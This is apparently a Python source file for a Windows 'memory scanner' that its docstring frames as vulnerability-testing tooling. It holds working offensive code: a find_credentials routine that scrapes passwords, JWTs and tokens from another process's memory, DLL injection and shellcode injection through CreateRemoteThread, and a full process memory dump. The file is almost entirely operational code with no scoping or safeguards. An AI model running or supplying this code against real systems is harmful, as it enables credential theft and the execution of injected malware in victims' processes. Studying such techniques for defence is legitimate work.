"""
Advanced Memory Scanner Module
Comprehensive memory analysis and manipulation for vulnerability testing
"""

import ctypes
import ctypes.wintypes as wintypes
import struct
import re
from typing import List, Dict, Optional, Tuple, Any
from dataclasses import dataclass
import logging

# Windows constants
PROCESS_ALL_ACCESS = 0x1F0FFF
PROCESS_VM_READ = 0x0010
PROCESS_VM_WRITE = 0x0020
PROCESS_VM_OPERATION = 0x0008
PROCESS_QUERY_INFORMATION = 0x0400

PAGE_READWRITE = 0x04
PAGE_EXECUTE_READWRITE = 0x40
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000

@dataclass
class MemoryRegion:
    """Memory region information"""
    base_address: int
    size: int
    protection: int
    state: int
    type: int
    readable: bool
    writable: bool
    executable: bool

@dataclass
class ScanResult:
    """Memory scan result"""
    address: int
    value: bytes
    region: MemoryRegion
    pattern: str
    context: bytes

class MemoryScanner:
    """Advanced memory scanning and manipulation"""

    def __init__(self):
        self.logger = logging.getLogger(__name__)
        self.kernel32 = ctypes.windll.kernel32
        self.ntdll = ctypes.windll.ntdll
        self.psapi = ctypes.windll.psapi

        # Scan statistics
        self.stats = {
            'regions_scanned': 0,
            'patterns_found': 0,
            'bytes_read': 0,
            'bytes_written': 0,
            'injections': 0
        }

    def open_process(self, pid: int) -> Optional[int]:
        """Open process for memory operations"""
        h_process = self.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
        if not h_process:
            self.logger.error(f"Failed to open process {pid}")
            return None
        return h_process

    def get_memory_regions(self, h_process: int) -> List[MemoryRegion]:
        """Get all memory regions of a process"""
        regions = []
        address = 0
        max_address = 0x7FFFFFFF0000 if ctypes.sizeof(ctypes.c_voidp) == 8 else 0x7FFE0000

        class MEMORY_BASIC_INFORMATION(ctypes.Structure):
            _fields_ = [
                ('BaseAddress', ctypes.c_void_p),
                ('AllocationBase', ctypes.c_void_p),
                ('AllocationProtect', wintypes.DWORD),
                ('RegionSize', ctypes.c_size_t),
                ('State', wintypes.DWORD),
                ('Protect', wintypes.DWORD),
                ('Type', wintypes.DWORD)
            ]

        mbi = MEMORY_BASIC_INFORMATION()
        mbi_size = ctypes.sizeof(MEMORY_BASIC_INFORMATION)

        while address < max_address:
            size = self.kernel32.VirtualQueryEx(
                h_process,
                ctypes.c_void_p(address),
                ctypes.byref(mbi),
                mbi_size
            )

            if size == 0:
                break

            if mbi.State == MEM_COMMIT:
                region = MemoryRegion(
                    base_address=mbi.BaseAddress,
                    size=mbi.RegionSize,
                    protection=mbi.Protect,
                    state=mbi.State,
                    type=mbi.Type,
                    readable=(mbi.Protect & 0x02) or (mbi.Protect & 0x04) or (mbi.Protect & 0x40),
                    writable=(mbi.Protect & 0x04) or (mbi.Protect & 0x40),
                    executable=(mbi.Protect & 0x10) or (mbi.Protect & 0x20) or (mbi.Protect & 0x40)
                )
                regions.append(region)

            address = mbi.BaseAddress + mbi.RegionSize

        self.logger.info(f"Found {len(regions)} memory regions")
        return regions

    def read_memory(self, h_process: int, address: int, size: int) -> Optional[bytes]:
        """Read memory from process"""
        buffer = ctypes.create_string_buffer(size)
        bytes_read = ctypes.c_size_t()

        success = self.kernel32.ReadProcessMemory(
            h_process,
            ctypes.c_void_p(address),
            buffer,
            size,
            ctypes.byref(bytes_read)
        )

        if success:
            self.stats['bytes_read'] += bytes_read.value
            return buffer.raw[:bytes_read.value]
        return None

    def write_memory(self, h_process: int, address: int, data: bytes) -> bool:
        """Write memory to process"""
        bytes_written = ctypes.c_size_t()

        # Change memory protection if needed
        old_protect = wintypes.DWORD()
        self.kernel32.VirtualProtectEx(
            h_process,
            ctypes.c_void_p(address),
            len(data),
            PAGE_EXECUTE_READWRITE,
            ctypes.byref(old_protect)
        )

        success = self.kernel32.WriteProcessMemory(
            h_process,
            ctypes.c_void_p(address),
            data,
            len(data),
            ctypes.byref(bytes_written)
        )

        # Restore protection
        self.kernel32.VirtualProtectEx(
            h_process,
            ctypes.c_void_p(address),
            len(data),
            old_protect.value,
            ctypes.byref(old_protect)
        )

        if success:
            self.stats['bytes_written'] += bytes_written.value

        return success

    def scan_pattern(self, h_process: int, pattern: bytes, mask: Optional[bytes] = None) -> List[ScanResult]:
        """Scan memory for pattern"""
        results = []
        regions = self.get_memory_regions(h_process)

        for region in regions:
            if not region.readable:
                continue

            # Read region memory
            memory = self.read_memory(h_process, region.base_address, region.size)
            if not memory:
                continue

            self.stats['regions_scanned'] += 1

            # Search for pattern
            if mask:
                # Pattern with wildcards
                matches = self._search_with_mask(memory, pattern, mask)
            else:
                # Exact pattern
                matches = self._search_exact(memory, pattern)

            for offset in matches:
                address = region.base_address + offset
                context_start = max(0, offset - 16)
                context_end = min(len(memory), offset + len(pattern) + 16)

                result = ScanResult(
                    address=address,
                    value=memory[offset:offset + len(pattern)],
                    region=region,
                    pattern=pattern.hex(),
                    context=memory[context_start:context_end]
                )

                results.append(result)
                self.stats['patterns_found'] += 1

        self.logger.info(f"Found {len(results)} pattern matches")
        return results

    def scan_string(self, h_process: int, search_str: str, encoding: str = 'utf-8') -> List[ScanResult]:
        """Scan memory for string"""
        pattern = search_str.encode(encoding)
        return self.scan_pattern(h_process, pattern)

    def scan_regex(self, h_process: int, pattern: str) -> List[ScanResult]:
        """Scan memory using regex"""
        results = []
        regions = self.get_memory_regions(h_process)
        regex = re.compile(pattern.encode('utf-8'))

        for region in regions:
            if not region.readable:
                continue

            memory = self.read_memory(h_process, region.base_address, region.size)
            if not memory:
                continue

            for match in regex.finditer(memory):
                address = region.base_address + match.start()
                result = ScanResult(
                    address=address,
                    value=match.group(0),
                    region=region,
                    pattern=pattern,
                    context=memory[max(0, match.start() - 16):min(len(memory), match.end() + 16)]
                )
                results.append(result)

        return results

    def find_credentials(self, h_process: int) -> Dict[str, List[str]]:
        """Search for potential credentials in memory"""
        credentials = {
            'passwords': [],
            'tokens': [],
            'keys': [],
            'certificates': []
        }

        # Common password patterns
        password_patterns = [
            b'password=',
            b'passwd=',
            b'pwd=',
            b'pass:',
            b'login:',
            b'user:',
            b'username:',
            b'email:'
        ]

        for pattern in password_patterns:
            results = self.scan_pattern(h_process, pattern)
            for result in results:
                # Extract value after pattern
                context = result.context.decode('utf-8', errors='ignore')
                if '=' in context:
                    value = context.split('=')[1].split()[0]
                    if value and len(value) > 3:
                        credentials['passwords'].append(value)

        # Token patterns (JWT, OAuth, etc.)
        token_patterns = [
            rb'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+',  # JWT
            rb'[A-Za-z0-9]{40}',  # Generic token
        ]

        for pattern_str in token_patterns:
            results = self.scan_regex(h_process, pattern_str.decode('utf-8'))
            for result in results:
                token = result.value.decode('utf-8', errors='ignore')
                if token:
                    credentials['tokens'].append(token)

        return credentials

    def inject_dll(self, h_process: int, dll_path: str) -> bool:
        """Inject DLL into process"""
        try:
            # Allocate memory for DLL path
            dll_path_bytes = dll_path.encode('utf-8') + b'\x00'
            path_addr = self.kernel32.VirtualAllocEx(
                h_process,
                None,
                len(dll_path_bytes),
                MEM_RESERVE | MEM_COMMIT,
                PAGE_READWRITE
            )

            if not path_addr:
                return False

            # Write DLL path
            if not self.write_memory(h_process, path_addr, dll_path_bytes):
                return False

            # Get LoadLibraryA address
            kernel32_handle = self.kernel32.GetModuleHandleW('kernel32.dll')
            load_library_addr = self.kernel32.GetProcAddress(
                kernel32_handle,
                b'LoadLibraryA'
            )

            # Create remote thread
            thread_handle = self.kernel32.CreateRemoteThread(
                h_process,
                None,
                0,
                load_library_addr,
                path_addr,
                0,
                None
            )

            if thread_handle:
                self.stats['injections'] += 1
                self.kernel32.WaitForSingleObject(thread_handle, 5000)
                self.kernel32.CloseHandle(thread_handle)
                return True

        except Exception as e:
            self.logger.error(f"DLL injection failed: {e}")

        return False

    def inject_shellcode(self, h_process: int, shellcode: bytes) -> bool:
        """Inject shellcode into process"""
        try:
            # Allocate memory
            mem_addr = self.kernel32.VirtualAllocEx(
                h_process,
                None,
                len(shellcode),
                MEM_RESERVE | MEM_COMMIT,
                PAGE_EXECUTE_READWRITE
            )

            if not mem_addr:
                return False

            # Write shellcode
            if not self.write_memory(h_process, mem_addr, shellcode):
                return False

            # Execute shellcode
            thread_handle = self.kernel32.CreateRemoteThread(
                h_process,
                None,
                0,
                mem_addr,
                None,
                0,
                None
            )

            if thread_handle:
                self.stats['injections'] += 1
                self.kernel32.CloseHandle(thread_handle)
                return True

        except Exception as e:
            self.logger.error(f"Shellcode injection failed: {e}")

        return False

    def _search_exact(self, memory: bytes, pattern: bytes) -> List[int]:
        """Search for exact pattern in memory"""
        results = []
        offset = 0

        while True:
            index = memory.find(pattern, offset)
            if index == -1:
                break
            results.append(index)
            offset = index + 1

        return results

    def _search_with_mask(self, memory: bytes, pattern: bytes, mask: bytes) -> List[int]:
        """Search with wildcards (? in mask = any byte)"""
        results = []
        pattern_len = len(pattern)

        for i in range(len(memory) - pattern_len + 1):
            match = True
            for j in range(pattern_len):
                if mask[j] != ord('?') and memory[i + j] != pattern[j]:
                    match = False
                    break

            if match:
                results.append(i)

        return results

    def dump_process_memory(self, pid: int, output_file: str) -> bool:
        """Dump entire process memory to file"""
        h_process = self.open_process(pid)
        if not h_process:
            return False

        try:
            with open(output_file, 'wb') as f:
                regions = self.get_memory_regions(h_process)
                for region in regions:
                    if region.readable:
                        memory = self.read_memory(h_process, region.base_address, region.size)
                        if memory:
                            f.write(memory)

            self.logger.info(f"Process memory dumped to {output_file}")
            return True

        except Exception as e:
            self.logger.error(f"Memory dump failed: {e}")
            return False

        finally:
            self.kernel32.CloseHandle(h_process)